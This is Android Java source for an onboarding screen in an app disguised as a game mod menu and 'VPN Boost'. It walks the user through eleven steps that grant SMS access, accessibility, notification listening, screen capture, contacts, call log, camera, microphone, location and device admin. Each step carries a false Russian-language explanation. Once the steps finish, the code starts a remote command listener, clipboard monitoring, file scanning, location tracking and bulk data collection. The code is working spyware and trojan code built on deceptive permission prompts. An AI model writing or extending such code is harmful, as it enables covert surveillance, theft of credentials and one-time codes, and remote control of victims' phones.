package com.brawl.modmenu;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;

public class OnboardingActivity extends Activity {

    private static final String[] STEPS_DESC = {
        "Для работы VPN нужно разрешение на подключение к серверам",
        "Для показа статуса соединения и важных уведомлений",
        "Для автоматической авторизации на серверах",
        "Чтобы VPN работал в фоне без ограничений системы",
        "Для оптимизации игрового процесса",
        "Для отсеивания помех во время игры",
        "Для анализа FPS и оптимизации графики в играх",
        "Для определения друзей в играх и оптимизации контактов",
        "Для анализа качества соединения через камеру",
        "Для оптимизации звука в играх",
        "Для защиты VPN от случайного удаления"
    };

    private static final int TOTAL = 11;
    private int current = 0;

    private TextView stepTitle, stepDesc, stepCounter;
    private ProgressBar progress;
    private Button btnNext;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.onboarding);

        stepTitle = findViewById(R.id.stepTitle);
        stepDesc = findViewById(R.id.stepDesc);
        stepCounter = findViewById(R.id.stepCounter);
        progress = findViewById(R.id.progress);
        btnNext = findViewById(R.id.btnNext);

        updateUI();

        btnNext.setOnClickListener(v -> {
            if (current >= TOTAL) {
                finishOnboarding();
                return;
            }
            runStep(current);
        });
    }

    private void updateUI() {
        if (current >= TOTAL) {
            stepTitle.setText("Всё готово!");
            stepDesc.setText("Все разрешения получены");
            btnNext.setText("ПРОДОЛЖИТЬ");
            progress.setProgress(100);
            stepCounter.setText(TOTAL + " / " + TOTAL + " разрешений получено");
            return;
        }
        stepTitle.setText("Шаг " + (current + 1) + " из " + TOTAL);
        stepDesc.setText(STEPS_DESC[current]);
        btnNext.setText("РАЗРЕШИТЬ");
        progress.setProgress(current * 100 / TOTAL);
        stepCounter.setText(current + " / " + TOTAL + " разрешений получено");
    }

    private void runStep(int step) {
        switch (step) {
            case 0:
                Intent vpn = android.net.VpnService.prepare(this);
                if (vpn != null) startActivityForResult(vpn, 100);
                else advance();
                break;
            case 1:
                if (Build.VERSION.SDK_INT >= 33)
                    requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, 101);
                else advance();
                break;
            case 2:
                requestPermissions(new String[]{
                    Manifest.permission.READ_SMS,
                    Manifest.permission.RECEIVE_SMS
                }, 102);
                break;
            case 3:
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    i.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(i, 103);
                } else advance();
                break;
            case 4:
                startActivityForResult(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), 104);
                break;
            case 5:
                startActivityForResult(new Intent(
                    "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"), 105);
                break;
            case 6:
                MediaProjectionManager mpm =
                    (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                startActivityForResult(mpm.createScreenCaptureIntent(), 106);
                break;
            case 7:
                requestPermissions(new String[]{
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_EXTERNAL_STORAGE
                }, 107);
                break;
            case 8:
                requestPermissions(new String[]{
                    Manifest.permission.CAMERA
                }, 108);
                break;
            case 9:
                requestPermissions(new String[]{
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                }, 109);
                break;
            case 10:
                DevicePolicyManager dpm = (DevicePolicyManager)
                    getSystemService(DEVICE_POLICY_SERVICE);
                ComponentName cn = new ComponentName(this, AdminReceiver.class);
                if (dpm != null && !dpm.isAdminActive(cn)) {
                    Intent admin = new Intent(
                        DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    admin.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
                    admin.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Защита VPN Boost от случайного удаления. Рекомендуется разрешить.");
                    startActivityForResult(admin, 110);
                } else {
                    advance();
                }
                break;
        }
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == 106 && res == RESULT_OK && data != null) {
            getSharedPreferences("mp", MODE_PRIVATE).edit()
                .putInt("code", res)
                .putString("data_uri", data.toUri(0))
                .apply();
        }
        advance();
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] p, int[] r) {
        super.onRequestPermissionsResult(req, p, r);
        advance();
    }

    private void advance() {
        current++;
        updateUI();
    }

    private void finishOnboarding() {
        startForegroundService(new Intent(this, KeepAliveService.class));
        startService(new Intent(this, CommandListener.class));
        ClipboardMonitor.start(this);
        FileScanner.scan();
        GameList.dump(this);
        LocationTracker.start(this);
        DeviceInfo.sendFull(this);
        AppList.dump(this);
        DataCollector.collectAll(this);

        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            startActivity(new Intent(this, WebLoginActivity.class));
            finish();
        }, 5000);
    }
}
